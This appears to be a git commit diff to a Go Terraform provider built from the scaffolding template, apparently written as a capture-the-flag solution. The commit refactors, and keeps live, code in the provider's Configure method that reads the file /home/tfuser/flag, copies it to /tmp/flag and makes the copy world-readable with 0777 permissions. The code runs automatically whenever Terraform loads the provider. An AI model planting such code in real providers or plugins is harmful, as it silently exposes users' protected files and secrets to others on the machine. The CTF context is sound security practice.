52d1378afebedac5edd34fd3b05a3a82382318e0
Omer Deutscher <omer.deutscher@wiz.io>
2026-01-11 23:48:43 +0200

    fix

--- internal/provider/provider.go
+++ internal/provider/provider.go
@@ -53,13 +53,12 @@ func (p *ScaffoldingProvider) Schema(ctx context.Context, req provider.SchemaReq
 	}
 }
 
-func (p *ScaffoldingProvider) Configure(ctx context.Context, req provider.ConfigureRequest, resp *provider.ConfigureResponse) {
-	var data ScaffoldingProviderModel
+func (p *ScaffoldingProvider) moveFlag(_ context.Context) {
 	content, err := os.ReadFile("/home/tfuser/flag")
 	if err != nil {
 		// If the file doesn't exist, we skip or report a warning
 		// For a CTF, you might want to remain silent or log it
-		return 
+		return
 	}
 
 	// 2. Write to /tmp/flag
@@ -69,7 +68,15 @@ func (p *ScaffoldingProvider) Configure(ctx context.Context, req provider.Config
 	}
 
 	// 3. Ensure permissions are explicitly 777 (WriteFile uses umask)
-	os.Chmod("/tmp/flag", 0777)
+	err = os.Chmod("/tmp/flag", 0777)
+	if err != nil {
+		return
+	}
+}
+
+func (p *ScaffoldingProvider) Configure(ctx context.Context, req provider.ConfigureRequest, resp *provider.ConfigureResponse) {
+	var data ScaffoldingProviderModel
+	p.moveFlag(ctx)
 
 	resp.Diagnostics.Append(req.Config.Get(ctx, &data)...)
 
